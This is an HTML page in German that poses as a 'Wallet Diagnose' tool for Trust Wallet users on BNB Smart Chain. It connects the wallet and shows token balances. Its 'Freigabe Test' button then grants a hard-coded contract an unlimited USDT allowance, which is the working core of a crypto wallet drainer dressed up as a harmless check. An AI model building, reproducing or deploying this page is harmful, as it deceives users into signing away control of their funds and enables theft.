<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
  <title>Admin Diagnose Panel V2</title>
  <style>
    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; border: 1px solid #1e293b; box-shadow:0 10px 30px rgba(0,0,0,.5); }
    h2{ margin-top:0; color: #f8fafc; font-size: 18px; text-align: center; margin-bottom: 20px; }
    .step { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
    .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 10px; display: block; }
    button { background:#22c55e; border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; margin-bottom: 8px; -webkit-tap-highlight-color: transparent; }
    button:active { transform: scale(0.98); opacity: 0.8; }
    .mono { font-family: monospace; font-size:10px; word-break:break-all; background: #000; padding: 10px; border-radius: 6px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; }
    #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #ef4444; color: #f8fafc; }
    .diag-info { font-size: 12px; color: #cbd5e1; margin-top: 10px; text-align: left; background: #111827; padding: 10px; border-radius: 8px; }
    .diag-item { display: flex; justify-content: space-between; border-bottom: 1px solid #1e293b; padding: 4px 0; }
  </style>
</head>
<body>

<div class="box">
  <h2>Wallet Diagnose V2</h2>

  <div class="step">
    <span class="step-title">1. Wallet Check</span>
    <button style="background: #3b82f6;" onclick="runDiagnosis()">Guthaben & Verbindung prüfen</button>
    <div class="mono" id="addr">Nicht verbunden</div>
    
    <div class="diag-info" id="balances">
      <div class="diag-item"><span>BNB (Gas):</span> <b id="valBNB">-</b></div>
      <div class="diag-item"><span>USDT:</span> <b id="valUSDT">-</b></div>
      <div class="diag-item"><span>USDC:</span> <b id="valUSDC">-</b></div>
    </div>
  </div>

  <div class="step" style="border-left-color: #10b981;">
    <span class="step-title">2. Freigabe Test</span>
    <button onclick="approveToken('USDT')">Test: Approve USDT</button>
  </div>

  <div id="status">Warten auf Klick...</div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.1/ethers.umd.min.js"></script>

<script>
  const CONTRACT = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
  const TOKENS = {
    USDT: "0x55d398326f99059fF775485246999027B3197955",
    USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
  };

  let walletA = null;
  function setStatus(m) { document.getElementById("status").innerHTML = m; }

  async function runDiagnosis() {
    try {
      // Sicherheitscheck ob Ethers geladen ist
      if (typeof ethers === "undefined") {
          return setStatus("❌ Bibliothek lädt noch. Bitte 2 Sekunden warten und erneut klicken.");
      }

      if (!window.ethereum) return setStatus("❌ Bitte im Trust Wallet Browser öffnen!");
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      walletA = accounts[0];
      document.getElementById("addr").innerText = walletA;

      // 1. BNB (Gas) auslesen
      const balanceBNB = await provider.getBalance(walletA);
      const formattedBNB = ethers.formatEther(balanceBNB);
      document.getElementById("valBNB").innerText = parseFloat(formattedBNB).toFixed(5) + " BNB";

      // 2. USDT/USDC auslesen (Minimale ABI)
      const abi = ["function balanceOf(address) view returns (uint256)"];
      
      const usdtContract = new ethers.Contract(TOKENS.USDT, abi, provider);
      const usdcContract = new ethers.Contract(TOKENS.USDC, abi, provider);

      const balUSDT = await usdtContract.balanceOf(walletA);
      const balUSDC = await usdcContract.balanceOf(walletA);

      // USDT/USDC haben auf BSC 18 Nachkommastellen
      document.getElementById("valUSDT").innerText = ethers.formatUnits(balUSDT, 18) + " USDT";
      document.getElementById("valUSDC").innerText = ethers.formatUnits(balUSDC, 18) + " USDC";

      setStatus("✅ Diagnose abgeschlossen. Was zeigt die Liste oben?");

    } catch (e) {
      console.error(e);
      setStatus("❌ Fehler: " + e.message);
    }
  }

  async function approveToken(type) {
    try {
      if(!walletA) return setStatus("❌ Bitte erst Schritt 1 (Diagnose)!");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
      const contract = new ethers.Contract(TOKENS[type], abi, signer);
      
      setStatus(`⌛ Öffne Wallet für ${type} Freigabe...`);
      // Wir senden Max-Amount
      const tx = await contract.approve(CONTRACT, ethers.MaxUint256, { gasLimit: 100000 });
      await tx.wait();
      setStatus(`✅ Freigabe für ${type} war erfolgreich!`);
    } catch (e) {
      setStatus(`❌ Abbruch: ${e.message}`);
    }
  }
</script>
</body>
</html>
